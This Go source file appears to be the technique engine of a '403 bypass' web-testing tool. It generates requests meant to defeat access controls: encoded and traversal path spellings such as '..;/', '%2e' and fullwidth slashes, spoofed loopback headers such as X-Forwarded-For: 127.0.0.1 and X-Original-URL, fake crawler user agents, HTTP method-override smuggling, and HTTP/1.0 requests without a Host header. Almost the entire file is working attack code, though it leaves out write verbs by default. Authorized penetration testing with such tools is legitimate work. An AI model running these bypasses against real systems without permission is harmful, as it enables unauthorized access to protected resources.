package bypass403

import (
	"net"
	"regexp"
	"strconv"
	"strings"
)

// maxCaseVariants caps how many case-switched spellings of the final segment
// are tried, so a long segment doesn't flood the run with near-identical
// requests.
const maxCaseVariants = 16

// category groups related techniques for the UI (grouped sections) and for
// anyone reading a report later -- it carries no behavior of its own.
type category string

const (
	categoryPath     category = "path"
	categoryHeader   category = "header"
	categoryMethod   category = "method"
	categoryProtocol category = "protocol"
)

// attemptSpec is one bypass technique to try -- everything doAttempt/
// doRawRequest needs to fire the request, plus the human-readable identity a
// Result surfaces it under.
type attemptSpec struct {
	id          string
	category    category
	description string
	method      string
	target      string            // literal request-target (path + "?query"), see doAttempt
	headers     map[string]string // extra headers this attempt sends, beyond opts.Headers
	hostHeader  string            // overrides the Host header/authority; "" means the real host
	// hostMutation derives the Host header from the real host at run time
	// ("trailing-dot" or "uppercase", see mutateHost); "" leaves it alone.
	hostMutation string
	body         string // request body sent with the attempt; "" sends none
	scheme       string // overrides the connection scheme; "" means the baseline's own
	// raw routes this attempt through doRawRequest instead of the normal
	// client -- "http10" for a plain HTTP/1.0 request line, "http10-no-host"
	// for HTTP/1.0 with no Host header, "no-host" for an HTTP/1.1 request with
	// no Host header at all. "" means the normal path (or the raw path for a
	// "//"-prefixed target, see runAttempt).
	raw string
}

// splitLastSegment splits an escaped path into everything up to and
// including the final "/" (dir) and the segment after it (last) -- e.g.
// "/api/admin" -> ("/api/", "admin"), "/admin/" -> ("/admin/", ""), "/" ->
// ("/", ""). Every path-manipulation technique below builds off this rather
// than the raw string, so each one only has to reason about the final
// segment it's actually trying to disguise.
func splitLastSegment(path string) (dir, last string) {
	i := strings.LastIndexByte(path, '/')
	if i < 0 {
		return "/", path
	}
	return path[:i+1], path[i+1:]
}

// percentEncodeFirst percent-encodes just the first byte of s -- e.g. "admin"
// -> "%61dmin". A WAF rule that string-matches the literal path won't
// recognize the encoded form, while a backend that percent-decodes the path
// before routing resolves it right back to the real resource.
func percentEncodeFirst(s string) string {
	if s == "" {
		return s
	}
	return percentEncodeByte(s[0]) + s[1:]
}

// percentEncodeLast percent-encodes just the final byte of s -- e.g. "admin"
// -> "admi%6e". The mirror image of percentEncodeFirst, for rules that anchor
// on the start of a segment.
func percentEncodeLast(s string) string {
	if s == "" {
		return s
	}
	return s[:len(s)-1] + percentEncodeByte(s[len(s)-1])
}

// percentEncodeAll percent-encodes every byte of s -- e.g. "admin" ->
// "%61%64%6d%69%6e". Decoders accept it; literal-string rules don't.
func percentEncodeAll(s string) string {
	var b strings.Builder
	// Each byte becomes its own %XX triplet.
	for i := 0; i < len(s); i++ {
		b.WriteString(percentEncodeByte(s[i]))
	}
	return b.String()
}

// doublePercentEncodeFirst re-encodes the "%" of percentEncodeFirst's output,
// e.g. "admin" -> "%2561dmin" -- for the layer one level further out (a proxy
// that decodes once before a WAF check, with the backend decoding a second
// time) than percentEncodeFirst alone reaches.
func doublePercentEncodeFirst(s string) string {
	if s == "" {
		return s
	}
	return "%25" + percentEncodeFirst(s)[1:]
}

// doublePercentEncodeAll double-encodes every byte of s -- e.g. "adm" ->
// "%2561%2564%256d". The two-layer form of percentEncodeAll, for a proxy that
// decodes once before its check and a backend that decodes again.
func doublePercentEncodeAll(s string) string {
	var b strings.Builder
	// Each byte becomes "%25" followed by the hex digits of its single escape.
	for i := 0; i < len(s); i++ {
		b.WriteString("%25")
		b.WriteString(percentEncodeByte(s[i])[1:])
	}
	return b.String()
}

// caseVariants returns case-switched spellings of seg, for the path case
// attempts: every single-letter flip first, then the two fully alternating
// spellings. The original is never returned, duplicates are dropped, and the
// list is capped at maxCaseVariants. Only ASCII letters are switched, since
// that is what case-sensitive path rules are written against.
func caseVariants(seg string) []string {
	original := []byte(seg)
	seen := map[string]bool{seg: true}
	var out []string
	// add records one variant unless it is a duplicate or the cap is reached.
	add := func(b []byte) {
		v := string(b)
		if seen[v] || len(out) >= maxCaseVariants {
			return
		}
		seen[v] = true
		out = append(out, v)
	}

	// One variant per letter, with only that letter's case flipped.
	for i, c := range original {
		if !isASCIILetter(c) {
			continue
		}
		flipped := append([]byte(nil), original...)
		flipped[i] = c ^ 0x20 // toggles the ASCII case bit
		add(flipped)
	}

	// The two alternating spellings: upper-case the even positions, then the odd.
	for _, start := range []int{0, 1} {
		alt := append([]byte(nil), original...)
		// Walk the letters, alternating the case of each one.
		for i := range alt {
			if !isASCIILetter(alt[i]) {
				continue
			}
			if (i-start)%2 == 0 {
				alt[i] = toUpperASCII(alt[i])
			} else {
				alt[i] = toLowerASCII(alt[i])
			}
		}
		add(alt)
	}
	return out
}

// isASCIILetter reports whether c is a-z or A-Z.
func isASCIILetter(c byte) bool {
	return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')
}

// toUpperASCII upper-cases an ASCII letter and leaves anything else alone.
func toUpperASCII(c byte) byte {
	if c >= 'a' && c <= 'z' {
		return c - 'a' + 'A'
	}
	return c
}

// toLowerASCII lower-cases an ASCII letter and leaves anything else alone.
func toLowerASCII(c byte) byte {
	if c >= 'A' && c <= 'Z' {
		return c - 'A' + 'a'
	}
	return c
}

// mutateHost rewrites the host-name part of host for the Host-header
// spellings in buildAttempts, keeping any :port intact. "trailing-dot" makes
// the name a fully-qualified form ("example.com."); "uppercase" upper-cases
// it. Any other kind returns host unchanged.
func mutateHost(host, kind string) string {
	name, port := host, ""
	// Split off a :port when there is one; a bare host or an IPv6 literal
	// without a port fails the split and is treated as all name.
	if h, p, err := net.SplitHostPort(host); err == nil {
		name, port = h, p
	}
	switch kind {
	case "trailing-dot":
		name += "."
	case "uppercase":
		name = strings.ToUpper(name)
	default:
		return host
	}
	if port == "" {
		return name
	}
	return net.JoinHostPort(name, port)
}

// percentEncodeByte renders one byte as an uppercase %XX escape.
func percentEncodeByte(b byte) string {
	const hex = "0123456789ABCDEF"
	return string([]byte{'%', hex[b>>4], hex[b&0x0f]})
}

// versionSegment matches a lone API-version path segment ("v1", "v2", "v12",
// ...) -- see the version-downgrade attempts below.
var versionSegment = regexp.MustCompile(`^v[0-9]+$`)

// withoutWriteMethods drops every attempt that sends PUT, PATCH or DELETE.
// Those verbs can overwrite or remove the target's data, so the default run
// leaves them out. The remaining attempts still cover the method-tampering
// cases that only read or probe.
func withoutWriteMethods(specs []attemptSpec) []attemptSpec {
	out := make([]attemptSpec, 0, len(specs))
	for _, spec := range specs {
		switch spec.method {
		case "PUT", "PATCH", "DELETE":
			continue
		}
		out = append(out, spec)
	}
	return out
}

// withoutNoOpHostMutations drops every Host-header attempt whose derived
// spelling equals the real host. Upper-casing an IP literal or a name that is
// already upper-case changes nothing, so sending it would only repeat the
// baseline request and count as a meaningless "attempt".
func withoutNoOpHostMutations(specs []attemptSpec, host string) []attemptSpec {
	out := make([]attemptSpec, 0, len(specs))
	// Walk every spec, keeping all except the Host spellings that change nothing.
	for _, spec := range specs {
		// Specs that don't derive their Host are always kept.
		if spec.hostMutation != "" && mutateHost(host, spec.hostMutation) == host {
			continue
		}
		out = append(out, spec)
	}
	return out
}

// buildAttempts lists every technique this engine tries against one target.
// basePath/query are the baseline request's already-escaped path and raw
// query (see url.URL.EscapedPath/RawQuery); scheme is the baseline's own
// ("http"/"https"), used only to pick protocol-scheme-swap's target scheme.
// trustedReferer is a same-origin URL to present as Referer -- the closest
// safe default to "a domain the app already trusts" without this engine
// having to guess at one.
//
// Every technique is a read-style request for the same resource. The method
// tricks send PUT/POST/PATCH/DELETE with no body -- the only way to test
// whether a verb-scoped rule is what's blocking a GET.
func buildAttempts(basePath, query, scheme, trustedReferer string) []attemptSpec {
	if basePath == "" {
		basePath = "/"
	}
	withQuery := func(path string) string {
		if query == "" {
			return path
		}
		return path + "?" + query
	}
	dir, last := splitLastSegment(basePath)
	trimmedNoSlash := strings.TrimSuffix(basePath, "/")
	trimmedNoLeadSlash := strings.TrimPrefix(basePath, "/")
	originalTarget := withQuery(basePath)

	var attempts []attemptSpec

	// --- Path manipulation: same resource, a path spelled differently
	// enough that a rule matching on the literal path (in a WAF, an nginx
	// `location` block, a hand-rolled auth check) stops recognizing it, while
	// whatever actually serves the page still resolves it to the same file.
	// seenPaths holds every path-category target already queued. Several
	// families can produce the same spelling (a suffix that equals an
	// existing trailing-slash toggle, say), and re-sending an identical
	// request only doubles the traffic without testing anything new.
	seenPaths := map[string]bool{}
	pathAttempt := func(id, desc, path string) {
		// A request-target has to start with "/" (or be absolute-form); the
		// tricks built from an empty trimmed root would otherwise send "%20"
		// or "." on their own, which is not a valid request at all.
		if !strings.HasPrefix(path, "/") && !strings.HasPrefix(path, "//") {
			return
		}
		target := withQuery(path)
		if seenPaths[target] {
			return
		}
		seenPaths[target] = true
		attempts = append(attempts, attemptSpec{id: id, category: categoryPath, description: desc, method: "GET", target: target})
	}

	toggledSlash := trimmedNoSlash
	if basePath == toggledSlash { // didn't have one -- add it
		toggledSlash += "/"
	}
	pathAttempt("path-trailing-slash-toggle", "Toggled the trailing slash", toggledSlash)
	pathAttempt("path-double-slash", "Doubled the slash immediately before the final path segment", dir+"/"+last)
	pathAttempt("path-double-slash-wrap", "Doubled the slash at both the start and end of the path", "//"+strings.Trim(basePath, "/")+"//")
	pathAttempt("path-dot-segment-suffix", "Appended a same-directory \".\" segment", trimmedNoSlash+"/.")
	pathAttempt("path-dot-segment-prefix", "Prefixed the path with a same-directory \".\" segment", "/."+trimmedNoLeadSlash)
	pathAttempt("path-dot-wrap-dotdot", "Wrapped the path in a \".\" prefix and a \"..\" suffix", "/."+basePath+"/..")
	pathAttempt("path-semicolon-param", "Appended a \"/..;/\" segment (some servlet containers strip \";\"-prefixed path parameters before routing)", trimmedNoSlash+"/..;/")
	pathAttempt("path-semicolon-prefix", "Prefixed the path with a bare \";\" segment", "/;"+trimmedNoLeadSlash)
	pathAttempt("path-dot-semicolon-prefix", "Prefixed the path with a \".;\" segment", "/.;"+trimmedNoLeadSlash)
	pathAttempt("path-double-slash-semicolon", "Prefixed the path with a \"//;//\" segment", "//;//"+trimmedNoLeadSlash)
	pathAttempt("path-uppercase", "Upper-cased the whole path", strings.ToUpper(basePath))
	pathAttempt("path-lowercase", "Lower-cased the whole path", strings.ToLower(basePath))
	pathAttempt("path-encode-first-char", "Percent-encoded the first character of the final path segment", dir+percentEncodeFirst(last))
	pathAttempt("path-encode-last-char", "Percent-encoded the last character of the final path segment", dir+percentEncodeLast(last))
	pathAttempt("path-encode-all-chars", "Percent-encoded every character of the final path segment", dir+percentEncodeAll(last))
	pathAttempt("path-double-encode-first-char", "Double percent-encoded the first character of the final path segment", dir+doublePercentEncodeFirst(last))
	pathAttempt("path-encoded-dot-prefix", "Prefixed the path with an encoded \".\" segment (/%2e/...)", "/%2e"+basePath)
	pathAttempt("path-encoded-dotdot-prefix", "Prefixed the path with an encoded \"..\" segment (/%2e%2e/...)", "/%2e%2e"+basePath)
	pathAttempt("path-double-encoded-dot-prefix", "Prefixed the path with a double percent-encoded \".\" segment (/%252e/...)", "/%252e"+basePath)
	pathAttempt("path-unicode-slash-prefix", "Prefixed the path with a fullwidth-slash homoglyph (decodes to another \"/\" in some stacks)", "/%ef%bc%8f"+trimmedNoLeadSlash)
	pathAttempt("path-trailing-space", "Appended a literal encoded space (%20) to the path", trimmedNoSlash+"%20")
	pathAttempt("path-trailing-tab", "Appended a literal encoded tab (%09) to the path", trimmedNoSlash+"%09")
	pathAttempt("path-trailing-nul", "Appended a literal encoded NUL byte (%00) to the path", trimmedNoSlash+"%00")
	pathAttempt("path-trailing-hash", "Appended a literal encoded \"#\" to the path", trimmedNoSlash+"%23")
	pathAttempt("path-trailing-question", "Appended a literal encoded \"?\" to the path", trimmedNoSlash+"%3f")
	pathAttempt("path-trailing-dot", "Appended a literal \".\" to the path (Windows and IIS strip trailing dots)", trimmedNoSlash+".")
	pathAttempt("path-trailing-semicolon", "Appended a bare \";\" to the path", trimmedNoSlash+";")
	pathAttempt("path-trailing-semicolon-slash", "Appended a \";/\" to the path", trimmedNoSlash+";/")
	pathAttempt("path-trailing-star", "Appended a \"/*\" wildcard segment", trimmedNoSlash+"/*")
	pathAttempt("path-trailing-encoded-slash", "Appended an encoded slash (%2f) to the path", trimmedNoSlash+"%2f")
	pathAttempt("path-trailing-double-encoded-slash", "Appended a double-encoded slash (%252f) to the path", trimmedNoSlash+"%252f")
	pathAttempt("path-trailing-encoded-backslash", "Appended an encoded backslash (%5c) to the path (IIS treats it as a separator)", trimmedNoSlash+"%5c")
	pathAttempt("path-json-suffix", "Appended a \".json\" extension (some Ruby routing stacks treat it as a distinct route)", trimmedNoSlash+".json")
	pathAttempt("path-html-suffix", "Appended a \".html\" extension (some static-file rules match extensions, not the route)", trimmedNoSlash+".html")
	pathAttempt("path-tilde-suffix", "Appended a \"/~\" suffix", trimmedNoSlash+"/~")
	pathAttempt("path-double-encode-all", "Double percent-encoded every character of the final path segment", dir+doublePercentEncodeAll(last))

	// The mid-path, separator and case families only make sense when there is
	// a final segment to disguise; a root or trailing-slash path has none.
	if last != "" {
		// Mid-path insertions: the same segment, with a traversal or
		// parameter spelling placed in front of it.
		for _, p := range midPathPayloads {
			pathAttempt(p.id, p.description, dir+p.value+last)
		}
		// Overlong and IIS-style separators need a parent directory to
		// replace the "/" of; at the root there is no separator to swap.
		if dir != "/" {
			for _, p := range separatorPayloads {
				pathAttempt(p.id, p.description, strings.TrimSuffix(dir, "/")+p.value+last)
			}
		}
		// Case flips of the final segment, for routers and rules that
		// compare case-sensitively while the filesystem or framework does not.
		for i, variant := range caseVariants(last) {
			pathAttempt("path-case-variant-"+strconv.Itoa(i), "Switched letter case in the final segment (\""+variant+"\")", dir+variant)
		}
	}

	// End-path suffixes: the path itself with one more control character,
	// encoded delimiter or extension appended to it.
	for _, p := range endPathPayloads {
		pathAttempt(p.id, p.description, trimmedNoSlash+p.value)
	}

	// Version-downgrade: if the path has a lone "/vN/" segment (an API
	// version), retry it against every lower version number -- an older,
	// since-deprecated version of the same endpoint may never have picked up
	// a since-added access check.
	segments := strings.Split(trimmedNoLeadSlash, "/")
	for i, seg := range segments {
		if !versionSegment.MatchString(seg) {
			continue
		}
		var n int
		for _, c := range seg[1:] {
			n = n*10 + int(c-'0')
		}
		for v := 1; v < n; v++ {
			newSegments := append([]string{}, segments...)
			newSegments[i] = seg[:1] + strconv.Itoa(v)
			pathAttempt("path-version-downgrade-v"+strconv.Itoa(v), "Retried against API version v"+strconv.Itoa(v)+" instead of "+seg, "/"+strings.Join(newSegments, "/"))
		}
		break // only the first version segment -- a path rarely has two
	}

	// --- Header manipulation: same path, a header that makes an
	// access-control check further down the chain believe the request
	// originated somewhere it trusts (an internal rewrite, localhost, a
	// front-end proxy) instead of from the actual, untrusted client.
	headerAttempt := func(id, desc, target string, headers map[string]string) {
		attempts = append(attempts, attemptSpec{id: id, category: categoryHeader, description: desc, method: "GET", target: target, headers: headers})
	}
	// Rewrite headers are tried two ways: against the site root (the request
	// a front-end rewrites to the protected path -- the usual form of this
	// trick) and against the protected path itself (for a back-end that reads
	// the header directly).
	// X-Forwarded-Uri and X-Forwarded-URL are the rewrite headers some
	// proxies (Traefik, nginx/OpenResty setups) set in place of X-Original-URL.
	for _, h := range []string{"X-Original-URL", "X-Rewrite-URL", "X-Override-URL", "X-Forwarded-Uri"} {
		headerAttempt("header-"+strings.ToLower(h), "Sent the real path in "+h+" against the site root (front-ends that rewrite on this header route the root request to the protected path)", "/", map[string]string{h: basePath})
		headerAttempt("header-"+strings.ToLower(h)+"-same-path", "Sent the real path in "+h+" against the protected path itself", originalTarget, map[string]string{h: basePath})
	}
	// X-Forwarded-URL carries the full request-URI rather than just the path.
	headerAttempt("header-x-forwarded-url", "Sent the full request-URI in X-Forwarded-URL against the site root", "/", map[string]string{"X-Forwarded-URL": originalTarget})
	ipHeaders := []string{
		"X-Forwarded-For", "X-Forwarded", "Forwarded-For", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
		"X-ProxyUser-Ip", "X-Client-IP", "Client-IP", "True-Client-IP", "Cluster-Client-IP", "X-Custom-IP-Authorization",
		"X-Real-IP", "X-Forward-For", "X-Forwarded-By", "CF-Connecting-IP", "Fastly-Client-IP", "X-Azure-ClientIP",
		"X-Original-Remote-Addr",
	}
	for _, h := range ipHeaders {
		headerAttempt("header-ip-"+strings.ToLower(h), "Claimed to be forwarded from 127.0.0.1 via "+h, originalTarget, map[string]string{h: "127.0.0.1"})
	}
	// Encoded loopback spellings: an allowlist that matches the literal
	// "127.0.0.1" misses them, but the platform's address parser accepts them.
	for _, enc := range encodedLoopbacks {
		for _, h := range encodedLoopbackHeaders {
			headerAttempt("header-ip-"+enc.id+"-"+strings.ToLower(h), "Claimed to be forwarded from loopback via "+h+", written as "+enc.description, originalTarget, map[string]string{h: enc.value})
		}
	}
	headerAttempt("header-x-forwarded-host", "Claimed to be forwarded from 127.0.0.1 via X-Forwarded-Host", originalTarget, map[string]string{"X-Forwarded-Host": "127.0.0.1"})
	// Host-naming headers that some apps (and proxies) take as the request's
	// own host, set to localhost so a "local-only" rule matches.
	for _, h := range []string{"X-Forwarded-Server", "X-Host", "X-HTTP-Host-Override"} {
		headerAttempt("header-"+strings.ToLower(h)+"-localhost", "Sent "+h+": localhost (some apps take this header as the request's own host)", originalTarget, map[string]string{h: "localhost"})
	}
	// Hop-by-hop abuse: the header is sent with a loopback value and also
	// listed in Connection, so a compliant proxy strips it before the origin
	// sees it. Some origins then fall back to treating the request as local.
	for _, h := range []string{"X-Forwarded-For", "X-Real-IP", "X-Custom-IP-Authorization"} {
		attempts = append(attempts, attemptSpec{
			id: "header-hop-by-hop-" + strings.ToLower(h), category: categoryHeader,
			description: "Sent " + h + ": 127.0.0.1 and listed it in Connection so a proxy strips it",
			method:      "GET", target: originalTarget,
			headers: map[string]string{h: "127.0.0.1", "Connection": "close, " + h},
		})
	}
	// Protocol-describing headers a TLS-terminating proxy sets. An app that
	// reads them as "this came in over HTTPS from the proxy" may skip the
	// check it applies to plain-HTTP requests.
	protoHeaders := []struct {
		id, desc string
		headers  map[string]string
	}{
		{"header-x-forwarded-proto-https", "Claimed the request arrived over HTTPS via X-Forwarded-Proto and X-Forwarded-Port", map[string]string{"X-Forwarded-Proto": "https", "X-Forwarded-Port": "443"}},
		{"header-front-end-https", "Claimed the request arrived over HTTPS via Front-End-Https: on", map[string]string{"Front-End-Https": "on"}},
		{"header-x-forwarded-ssl", "Claimed the request arrived over SSL via X-Forwarded-Ssl: on", map[string]string{"X-Forwarded-Ssl": "on"}},
		{"header-x-url-scheme", "Claimed the request arrived over HTTPS via X-Url-Scheme: https", map[string]string{"X-Url-Scheme": "https"}},
	}
	// Send each protocol-header claim as its own request.
	for _, p := range protoHeaders {
		headerAttempt(p.id, p.desc, originalTarget, p.headers)
	}
	// The standardized Forwarded header (RFC 7239) carries the same claims
	// as the X- headers above in one field.
	headerAttempt("header-forwarded-rfc7239", "Claimed a loopback client over HTTPS via the RFC 7239 Forwarded header", originalTarget, map[string]string{"Forwarded": "for=127.0.0.1;proto=https;host=localhost"})
	// Origin from the same site, for rules that exempt same-origin requests.
	if trustedReferer != "" {
		headerAttempt("header-origin", "Sent a same-origin Origin header", originalTarget, map[string]string{"Origin": strings.TrimSuffix(trustedReferer, "/")})
	}
	headerAttempt("header-user-agent-googlebot", "Presented as Googlebot's User-Agent (some rules allowlist known crawlers)", originalTarget, map[string]string{"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"})
	headerAttempt("header-user-agent-bingbot", "Presented as Bingbot's User-Agent (some rules allowlist known crawlers)", originalTarget, map[string]string{"User-Agent": "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"})
	if trustedReferer != "" {
		headerAttempt("header-referer", "Sent a same-origin Referer", originalTarget, map[string]string{"Referer": trustedReferer})
	}
	// Host-header attempts change the *authority* the server is asked to
	// route for, not a plain header -- doAttempt/doRawRequest keep dialing
	// the real host regardless (see hostHeader's doc comment).
	attempts = append(attempts, attemptSpec{id: "header-host-localhost", category: categoryHeader, description: "Sent the request with Host: localhost", method: "GET", target: originalTarget, hostHeader: "localhost"})
	attempts = append(attempts, attemptSpec{id: "header-host-removed", category: categoryHeader, description: "Sent the request with no Host header at all", method: "GET", target: originalTarget, raw: "no-host"})
	// Host spellings a vhost rule keyed on the exact host name doesn't match
	// but the server's own host resolution still accepts.
	attempts = append(attempts, attemptSpec{id: "header-host-trailing-dot", category: categoryHeader, description: "Sent the real host with a trailing dot (FQDN form) in the Host header", method: "GET", target: originalTarget, hostMutation: "trailing-dot"})
	attempts = append(attempts, attemptSpec{id: "header-host-uppercase", category: categoryHeader, description: "Sent the real host upper-cased in the Host header", method: "GET", target: originalTarget, hostMutation: "uppercase"})

	// --- Method tricks: same path, a different verb (or a header asking a
	// framework to treat the request as one) in case the access check is
	// only wired up in front of GET.
	methodAttempt := func(id, desc, method string, headers map[string]string) {
		attempts = append(attempts, attemptSpec{id: id, category: categoryMethod, description: desc, method: method, target: originalTarget, headers: headers})
	}
	methodAttempt("method-head", "Retried with HEAD", "HEAD", nil)
	methodAttempt("method-post", "Retried with POST", "POST", nil)
	methodAttempt("method-put", "Retried with PUT", "PUT", nil)
	methodAttempt("method-delete", "Retried with DELETE", "DELETE", nil)
	methodAttempt("method-patch", "Retried with PATCH", "PATCH", nil)
	methodAttempt("method-options", "Retried with OPTIONS", "OPTIONS", nil)
	methodAttempt("method-trace", "Retried with TRACE (may echo intermediate-proxy headers back)", "TRACE", nil)
	methodAttempt("method-lowercase-get", "Retried with a lower-cased verb (\"get\"), which some verb-matching rules don't normalize", "get", nil)
	// Mixed-case spellings of GET, for verb rules that match only one casing.
	methodAttempt("method-case-capitalized", "Retried with a capitalized verb (\"Get\"), which some verb-matching rules don't normalize", "Get", nil)
	methodAttempt("method-case-mixed", "Retried with a mixed-case verb (\"gEt\"), which some verb-matching rules don't normalize", "gEt", nil)
	methodAttempt("method-override-header", "Sent POST with X-HTTP-Method-Override: GET", "POST", map[string]string{"X-HTTP-Method-Override": "GET"})
	methodAttempt("method-header", "Sent POST with X-HTTP-Method: GET", "POST", map[string]string{"X-HTTP-Method": "GET"})
	methodAttempt("method-override-x-method-override", "Sent POST with X-Method-Override: GET", "POST", map[string]string{"X-Method-Override": "GET"})
	methodAttempt("method-override-head", "Sent POST with X-HTTP-Method-Override: HEAD", "POST", map[string]string{"X-HTTP-Method-Override": "HEAD"})
	// Framework method overrides read from the query string or the body
	// rather than a header (Rails, Laravel, Symfony and Express method-override
	// all honor _method). The request stays a POST; only the framework's view
	// of it becomes GET. Frameworks only read _method on POST, so that is what is sent.
	overrideTarget := originalTarget + "&_method=GET"
	if query == "" {
		overrideTarget = basePath + "?_method=GET"
	}
	attempts = append(attempts, attemptSpec{id: "method-override-query", category: categoryMethod, description: "Sent POST with ?_method=GET in the query string", method: "POST", target: overrideTarget})
	attempts = append(attempts, attemptSpec{id: "method-override-body-form", category: categoryMethod, description: "Sent POST with _method=GET in a form-encoded body", method: "POST", target: originalTarget, headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"}, body: "_method=GET"})
	attempts = append(attempts, attemptSpec{id: "method-override-body-json", category: categoryMethod, description: "Sent POST with {\"_method\":\"GET\"} in a JSON body", method: "POST", target: originalTarget, headers: map[string]string{"Content-Type": "application/json"}, body: `{"_method":"GET"}`})

	// --- Protocol tricks: same path and method, a different wire protocol
	// or scheme in case the access check lives in a layer that only applies
	// to one of them.
	attempts = append(attempts, attemptSpec{
		id: "protocol-http10", category: categoryProtocol,
		description: "Repeated the request over a plain HTTP/1.0 request line",
		method:      "GET", target: originalTarget, raw: "http10",
	})
	attempts = append(attempts, attemptSpec{
		id: "protocol-http10-no-host", category: categoryProtocol,
		description: "Repeated the request over HTTP/1.0 with no Host header",
		method:      "GET", target: originalTarget, raw: "http10-no-host",
	})
	swapped := "https"
	if scheme == "https" {
		swapped = "http"
	}
	attempts = append(attempts, attemptSpec{
		id: "protocol-scheme-swap", category: categoryProtocol,
		description: "Retried over " + swapped + " instead of the original scheme",
		method:      "GET", target: originalTarget, scheme: swapped,
	})

	return attempts
}
